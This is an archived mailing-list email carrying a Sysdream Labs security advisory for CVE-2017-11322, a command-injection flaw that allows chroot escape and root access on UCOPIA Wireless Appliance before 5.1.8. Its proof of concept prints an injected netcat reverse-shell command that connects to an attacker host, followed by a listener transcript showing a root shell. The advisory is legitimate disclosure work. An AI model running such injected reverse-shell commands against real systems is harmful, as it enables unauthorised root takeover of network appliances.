X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3951" "Friday" "29" "September" "2017" "15:02:24" "+0200" "Sysdream Labs" "labs@sysdream.com" "<0495fde6-eee0-e1e3-a58d-dc3fe4dcebf1@sysdream.com>" "132" "[oss-security] [CVE-2017-11322] UCOPIA Wireless Appliance < 5.1.8 Privileges Escalation" nil nil nil "9" "2017092913:02:24" "[oss-security] [CVE-2017-11322] UCOPIA Wireless Appliance < 5.1.8 Privileges Escalation" (number mark "U       labs@sysdrea Sep 29  132/3951  " thread-indent "\"[oss-security] [CVE-2017-11322] UCOPIA Wireless Appliance < 5.1.8 Privileges Escalation\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 19715 invoked by uid 550); 29 Sep 2017 13:02:39 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 19662 invoked from network); 29 Sep 2017 13:02:38 -0000
DKIM-Filter: OpenDKIM Filter v2.9.2 mail.sysdream.com ED4A61A1434
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sysdream.com;
	s=FEF1D5FC-BC6A-11E6-98AA-27E162F08D53; t=1506690145;
	bh=4B5Z70ETvEb+v/KMEyzYV+PTiUwqanvTk0rKIm5PoRQ=;
	h=To:From:Subject:Message-ID:Date:MIME-Version:Content-Type;
	b=PooyEqQwtcVGhZxYrtZ3x0qfKkeSJjmCXDhqRNiu+6jDkS3PF3aduE5IWMWkyNaW6
	 Y4+CY9uOhzb9Odo4SGwoOiF0Kbfnc3uzr+rXLRneeaPDpIAD3RUMiiizvdRSB0/s0Q
	 Ah2i1kDzcaQkXPRINAzC4dDufmP/5bfRh7LFZgRY=
X-Virus-Scanned: amavisd-new at sysdream.com
To: fulldisclosure@seclists.org
Cc: oss-security@lists.openwall.com
From: Sysdream Labs <labs@sysdream.com>
Message-ID: <0495fde6-eee0-e1e3-a58d-dc3fe4dcebf1@sysdream.com>
Date: Fri, 29 Sep 2017 15:02:24 +0200
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.2.1
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
 protocol="application/pgp-signature";
 boundary="Tn7teOIwmkTfkeDD97MUh8LF8aa31ivVA"
Subject: [oss-security] [CVE-2017-11322] UCOPIA Wireless Appliance < 5.1.8 Privileges
 Escalation

--Tn7teOIwmkTfkeDD97MUh8LF8aa31ivVA
Content-Type: multipart/mixed; boundary="xTibcxPHvN39WJvHmHECW1OM6pGsQG2Oc";
 protected-headers="v1"
From: Sysdream Labs <labs@sysdream.com>
To: fulldisclosure@seclists.org
Cc: oss-security@lists.openwall.com
Message-ID: <0495fde6-eee0-e1e3-a58d-dc3fe4dcebf1@sysdream.com>
Subject: [CVE-2017-11322] UCOPIA Wireless Appliance < 5.1.8 Privileges
 Escalation

--xTibcxPHvN39WJvHmHECW1OM6pGsQG2Oc
Content-Type: text/plain; charset=utf-8
Content-Language: en-US
Content-Transfer-Encoding: quoted-printable

# [CVE-2017-11322] UCOPIA Wireless Appliance < 5.1.8 Privileges Escalation

## Asset description

UCOPIA solutions bring together a combination of software, appliance and cl=
oud services serving small to large customers.

More than 12,000 UCOPIA solutions are deployed and maintained by UCOPIA exp=
ert partners all over the world.

The affected asset in this report is a WiFi management appliance.

## Vulnerability

CHROOT escape and privileges escalation.

**Threat**

Improper sanitization of system commands in the chroothole_client executabl=
e in UCOPIA Wireless Appliance, prior to 5.1.8, allows local attackers to e=
levate privileges to root user and escape from the *chroot*.

**CVE ID**: CVE-2017-11322

**Access Vector**: local

**Security Risk**: high

**Vulnerability**: CWE-78

**CVSS Base Score**: 8.2 (High)

**CVSS Vector**: CVSS:3.0/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H

### Proof of Concept: chroot escape / privileges escalation

The **chroothole_client** binary is used by the appliance to run programs o=
utside the *chroot*, as the **root** user.

Because of an improper sanitization of system commands, we managed to gain =
a complete **root** access to the appliance, outside the *chroot*.

```
$ chroothole_client '/usr/sbin/status'
is not running ... failed !
$ chroothole_client '/usr/sbin/status $(which nc)'
/bin/nc is not running ... failed!
$ chroothole_client '/usr/sbin/status $(nc 10.0.0.125 4444 -e /bin/sh)'
```

Attacker terminal :

```
$ ncat -lvp 4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.0.1:49156.
whoami
root
```

## Solution

Update to UCOPIA 5.1.8

## Timeline (dd/mm/yyyy)

* 08/03/2017 : Vulnerability discovery.
* 03/05/2017 : Initial contact.
* 10/05/2017 : GPG Key exchange.
* 10/05/2017 : Advisory sent to vendor.
* 17/05/2017 : Request for feedback.
* 22/05/2017 : Vendor acknowledge the vulnerabilities.
* 21/06/2017 : Sysdream Labs request for an ETA, warning for public disclos=
ure.
* 21/06/2017 : Vendor say that the UCOPIA 5.1.8 fixes the issue.
* 29/09/2017 : Public disclosure.

## Credits

* Nicolas CHATELAIN, Sysdream (n.chatelain -at- sysdream -dot- com)

--=20
SYSDREAM Labs <labs@sysdream.com>

GPG :
47D1 E124 C43E F992 2A2E
1551 8EB4 8CD9 D5B2 59A1

* Website: https://sysdream.com/
* Twitter: @sysdream


--xTibcxPHvN39WJvHmHECW1OM6pGsQG2Oc--

--Tn7teOIwmkTfkeDD97MUh8LF8aa31ivVA
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEER9HhJMQ++ZIqLhVRjrSM2dWyWaEFAlnORGAACgkQjrSM2dWy
WaEWZRAAoOqInEXptyR3UbHOQ+1uFkVZ11MfLLcmiGD7agwESIdXZNV9LZCEUoSO
6K+KvTHzOBe8ZRcKC7D5WSHJv77mLMOZ2XidQnj1pmRCqJSCwdCcuoNFd3HJdy1U
8BSCyrJl8Xl5WlfFMzg8ph8n05hQi9Fu23LS+Da5gqjG8VMYOmqUaFbfBFHl6gc1
6DofU+0TmqRLKgkrLcX1BnwLTfY5d+yODbHn01QgiGvgt7PTGBBF2eTmzXrPki8F
v3A2XnryloIqgqoz8v6hfIDPmsWIfkKCH2ClMSbdMIDhtpY6j0bC/+r9KZ/EsAWU
c7AxjrXLFbxZPG7NkEhqjpdVh4a1wPho3UPuH3GWS4HWR2z7iMBNI2Qr98wG8Ypc
bmSrSjAItFxxUrGiPgG5NMyN19uDzukoLzzHiV31zPqYnIkaZg89GSJ4sn1XHEJ6
nq4X5mQjAeKrIuRMTk8N6im7Ao87r6Cq0i0BA3jeelDDN+NCZwUkSU7g2pFCpZkk
DSDodwxT9VGMHUoPVcmHaEvlPHNkxyoFdG1c0RxXvY/A4n/b1g4xnEI/wvdB9ail
Ug24HDId8hNCn7t9rZsqpAfmmlHQAOTUK7dj93Fw6FOFaceguEYPuBJNoiyyWI9r
NgtHqtNpg6aSwLbfirtQUOvsbhPDNtaURIjkmcwrup/keDsKNAg=
=HGjQ
-----END PGP SIGNATURE-----

--Tn7teOIwmkTfkeDD97MUh8LF8aa31ivVA--
